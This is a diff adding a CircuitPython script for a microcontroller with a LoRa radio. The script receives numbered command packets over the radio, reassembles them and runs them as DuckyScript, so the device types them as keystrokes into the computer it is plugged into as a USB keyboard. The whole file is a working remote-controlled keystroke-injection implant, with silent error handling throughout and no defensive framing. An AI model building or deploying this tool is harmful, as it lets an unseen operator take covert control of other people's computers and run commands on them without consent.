@@ -1,0 +1,98 @@
+import board
+import busio
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+import mod_ducky as adafruit_ducky
+import digitalio
+
+class Lora:
+    def __init__(self, tx_pin, rx_pin, baudrate, peer=77):
+        self.uart = busio.UART(tx=tx_pin, rx=rx_pin, baudrate=baudrate)
+        self.peer = peer
+        self.band=868600000
+        self.adr=88
+        self.network_id=10
+
+        # init that shit
+        self.uart.write(bytes("AT+NOIDEA\r\n", "ascii"))
+        time.sleep(3)
+        self.uart.write(bytes(f"AT+BAND={self.band}\r\n", "ascii"))
+        time.sleep(3)
+        self.uart.write(bytes(f"AT+ADDRESS={self.adr}\r\n", "ascii"))
+        time.sleep(3)
+        self.uart.write(bytes(f"AT+NETWORKID={self.network_id}\r\n", "ascii"))
+        time.sleep(3)
+
+        # clear the queue
+        while self.uart.readline():
+            pass
+
+    def receive(self):
+        try:
+            msg = self.uart.readline()
+            if msg:
+                if msg.startswith(b"+RCV"):
+                    data = msg.decode("ascii").split(",")[2]
+                    rly = data.split("#")
+                    time.sleep(5)
+                    self.ack_back(rly[0])
+                    #return {"seq": int(rly[0]), "cmd": rly[1]}
+                    return data
+        except Exception:
+            pass
+
+    def ack_back(self, sq_nr):
+        try:
+            self.uart.write(bytes(f"AT+SEND={self.peer},{len(str(sq_nr))},{sq_nr}\r\n", "ascii"))
+        except Exception:
+            pass
+
+led = digitalio.DigitalInOut(board.LED)
+led.direction = digitalio.Direction.OUTPUT
+
+def blink(times):
+    for t in range(times):
+        led.value = True
+        time.sleep(0.2)
+        led.value = False
+        time.sleep(0.2)
+    led.value = False
+    time.sleep(1)
+
+keyboard = Keyboard(usb_hid.devices)
+keyboard_layout = KeyboardLayoutUS(keyboard)
+
+def execute_script(commands):
+    try:
+        duck = adafruit_ducky.Ducky(commands, keyboard, keyboard_layout)
+        not_yet = True
+        while not_yet:
+            not_yet = duck.loop()
+    except Exception:
+        pass
+
+def listen(lora_instance):
+    full_script = []
+    while True:
+        try:
+            packet = lora_instance.receive()
+            if packet:
+                blink(5) # blink five times when new packet
+                if packet.split("#", 1)[1] == "DNE":
+                    srtd = sorted(set(full_script))
+                    fnl = [item.split("#", 1)[1] for item in srtd]
+                    execute_script(fnl)
+                    full_script = []
+                else:
+                    full_script.append(packet)
+        except Exception:
+            pass
+
+try:
+    lora = Lora(tx_pin=board.GP16, rx_pin=board.GP13, baudrate=115200)
+    blink(10)
+    listen(lora)
+except Exception:
+    pass
